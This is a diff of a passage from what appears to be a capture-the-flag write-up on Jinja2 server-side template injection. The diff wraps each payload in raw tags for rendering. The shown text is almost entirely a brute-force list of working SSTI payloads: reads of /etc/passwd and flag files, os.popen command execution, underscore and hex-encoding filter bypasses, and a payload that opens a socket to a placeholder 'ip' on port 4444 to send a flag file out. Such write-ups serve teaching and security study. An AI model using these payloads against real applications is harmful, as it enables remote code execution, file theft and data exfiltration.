@@ -37,40 +37,40 @@ We already know the website is using Jinja2 as template engine based on challeng
 We will brute force to identify the correct payload based on Jinja2:
 
 ```jsx
-{{4*4}}
-{{7*7}}
-{{7*'7'}}
-{{dump(app)}}
-{{app.request.server.all|join(',')}}
-{{config.items()}}
-{{ [].class.base.subclasses() }}
-{{''.class.mro()[1].subclasses()}}
-{{ ''.__class__.__mro__[2].__subclasses__() }}
+{% raw %}{{4*4}}{% endraw %}
+{% raw %}{{7*7}}{% endraw %}
+{% raw %}{{7*'7'}}{% endraw %}
+{% raw %}{{dump(app)}}{% endraw %}
+{% raw %}{{app.request.server.all|join(',')}}{% endraw %}
+{% raw %}{{config.items()}}{% endraw %}
+{% raw %}{{ [].class.base.subclasses() }}{% endraw %}
+{% raw %}{{''.class.mro()[1].subclasses()}}{% endraw %}
+{% raw %}{{ ''.__class__.__mro__[2].__subclasses__() }}{% endraw %}
 {% raw %}{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}{% endraw %}
-{{ request }}
-{{self}}
-{{app.request.query.filter(0,0,1024,{'options':'system'})}}
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
-{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
-{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
-{{['id']|filter('system')}}
-{{['cat\x20/etc/passwd']|filter('system')}}
-{{['cat$IFS/etc/passwd']|filter('system')}}
-{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
-{{request|attr(["_"*2,"class","_"*2]|join)}}
-{{request|attr(["__","class","__"]|join)}}
-{{request|attr("__class__")}}
-{{request.__class__}}
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
-{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
-{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
-{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
-{{cycler.__init__.__globals__.os}}
-{{joiner.__init__.__globals__.os}}
-{{namespace.__init__.__globals__.os}}
+{% raw %}{{ request }}{% endraw %}
+{% raw %}{{self}}{% endraw %}
+{% raw %}{{app.request.query.filter(0,0,1024,{'options':'system'})}}{% endraw %}
+{% raw %}{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}{% endraw %}
+{% raw %}{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}{% endraw %}
+{% raw %}{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}{% endraw %}
+{% raw %}{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}{% endraw %}
+{% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}{% endraw %}
+{% raw %}{{['id']|filter('system')}}{% endraw %}
+{% raw %}{{['cat\x20/etc/passwd']|filter('system')}}{% endraw %}
+{% raw %}{{['cat$IFS/etc/passwd']|filter('system')}}{% endraw %}
+{% raw %}{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}{% endraw %}
+{% raw %}{{request|attr(["_"*2,"class","_"*2]|join)}}{% endraw %}
+{% raw %}{{request|attr(["__","class","__"]|join)}}{% endraw %}
+{% raw %}{{request|attr("__class__")}}{% endraw %}
+{% raw %}{{request.__class__}}{% endraw %}
+{% raw %}{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}{% endraw %}
+{% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}{% endraw %}
+{% raw %}{{self._TemplateReference__context.cycler.__init__.__globals__.os}}{% endraw %}
+{% raw %}{{self._TemplateReference__context.joiner.__init__.__globals__.os}}{% endraw %}
+{% raw %}{{self._TemplateReference__context.namespace.__init__.__globals__.os}}{% endraw %}
+{% raw %}{{cycler.__init__.__globals__.os}}{% endraw %}
+{% raw %}{{joiner.__init__.__globals__.os}}{% endraw %}
+{% raw %}{{namespace.__init__.__globals__.os}}{% endraw %}
 ```
 
 We successfully identified the correct payload that successfully executed on the server:
